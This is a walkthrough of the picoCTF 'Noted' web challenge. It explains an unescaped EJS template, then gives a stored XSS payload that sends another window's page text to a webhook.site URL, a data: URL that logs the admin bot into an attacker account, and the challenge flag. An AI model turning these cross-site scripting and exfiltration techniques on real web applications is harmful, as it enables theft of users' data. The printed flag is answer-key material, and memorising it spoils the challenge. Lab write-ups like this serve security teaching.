# Walkthrough for picoCTF "Noted" Challenge
I have finished the "Noted" Challenge (Hard level) from picoCTF, and here is my walkthrough for you:
#
# Prerequisites and Setup
- Access the challenge site at `http://saturn.picoctf.net:60244/` (or the equivalent hosted instance during the event).
- Download and review the source code from the challenge attachments or GitHub mirrors (e.g., a tar.gz containing the Node.js app).
- The app uses Fastify (web framework), EJS (templating), SQLite3 (DB), and Puppeteer (headless Chrome automation).
- Set up a webhook receiver like https://webhook.site/ to capture exfiltrated data (create a unique URL, e.g., `https://webhook.site/#!/d84a226b-8c34-494f-b6d4-6022aded5b82`). Tools like ngrok or requestbin.com work too.
- No other special setup is needed; the bot's browser has internet access despite the challenge description.
#
## Step 1: Analyze the Source Code and Identify Vulnerabilities
- Unpack the source and check `package.json` for dependencies:
  ```text
  "dependencies": {
  "argon2": "^0.28.3",
  "ejs": "^3.1.6",
  "fastify": "^3.25.3",
  "fastify-csrf": "^3.1.0",
  "fastify-formbody": "^5.2.0",
  "fastify-secure-session": "^3.0.0",
  "point-of-view": "^5.0.0",
  "puppeteer": "^13.0.1",
  "sequelize": "^6.12.5",
  "sqlite3": "^5.0.2"
  }
  ```
  This confirms it's a Node.js app with EJS templating and Puppeteer.

- In `views/notes.ejs`, look for the note rendering: It uses `<%- note.body %>`, which is an *unescaped* EJS output (per EJS docs). This enables HTML/JS injection on the `/notes` page.
- Test the XSS: Log in, create a note with body `<script>alert(1)</script>`, then visit `/notes`. An alert will pops up, which reflected self-XSS confirmed.
- Review `report.js` (the report endpoint handler):
   - The bot creates a random account.
   - Navigates to a new note page.
   - Posts a note with the flag as content.
   - Goes to `about:blank`.
   - Closes the browser after 7.5 seconds.
- Key insight: Despite "no internet" claims by reporting a webhook URL; the bot still fetches it, proving outbound access.
#
## Step 2: Create an Attacker-Controlled Account
- On the challenge site, register an account with username `a` and password `a`.
- Log in to verify access to `/notes` and note creation.
#
## Step 3: Plant the XSS Payload in a Note
While logged in as `a:a`, create a new note with this body (injected via the unescaped EJS):
```text
<script>
if (window.location.search.includes("run_xss")) {
    window.location = "https://webhook.site/d84a226b-8c34-494f-b6d4-6022aded5b82?" + window.open("", "pico").document.body.textContent
}
</script>
```
- How it works:
   - Checks for `?run_xss` in the URL.
   - `window.open("", "pico")` reuses the existing "pico" window (avoids new-tab prompts in headless mode).
   - Grabs `textContent` from its `<body>` (which includes the flag note).
   - Redirects to your webhook with the content as a query param (exfiltrates via GET).
#
## Step 4: Craft the Report Payload to Trigger the Exploit
- The report form takes a URL. Use a data: URL to inject a full malicious HTML page into the bot's browser (bypasses scheme restrictions).
- Payload (paste into the report field and submit):
```text
data:text/html,
<form action="http://0.0.0.0:8080/login" method=POST id="login_form" target="_blank">
    <input type="text" name="username" value="a"><input type="text" name="password" value="a">
</form>
<script>
    window.open("http://0.0.0.0:8080/notes", "pico");
    setTimeout(function() {login_form.submit()}, 1000);
    setTimeout(function() {window.location="http://0.0.0.0:8080/notes?run_xss"}, 2000);
</script>
```
- Breakdown:
    - The `data:` scheme loads custom HTML directly in the browser.
    - Form auto-logs in as `a:a` in a `_blank` window (POST to `/login` sets session cookie without blocking).
    - `window.open("/notes", "pico")` loads the notes page (with flag and your XSS note) into a named window. Headless Chrome allows this without pop-up blocks.
    - After 1s: Submit login (authenticates the session).
    - After 2s total: Navigate main window to `/notes?run_xss`, triggering your payload.
    - Same-origin policy lets the script access the "pico" window's DOM via the returned WindowProxy.
- Click "Report", bot will launch, and executes this in ~2s (before 7.5s timeout).
#
## Step 5: Capture the Flag
- Watch your webhook dashboard.
- A GET request arrives shortly (`/?picoCTF{...}`).
- Extract the flag from the query param/body text.
#
# Flag
`picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}`


























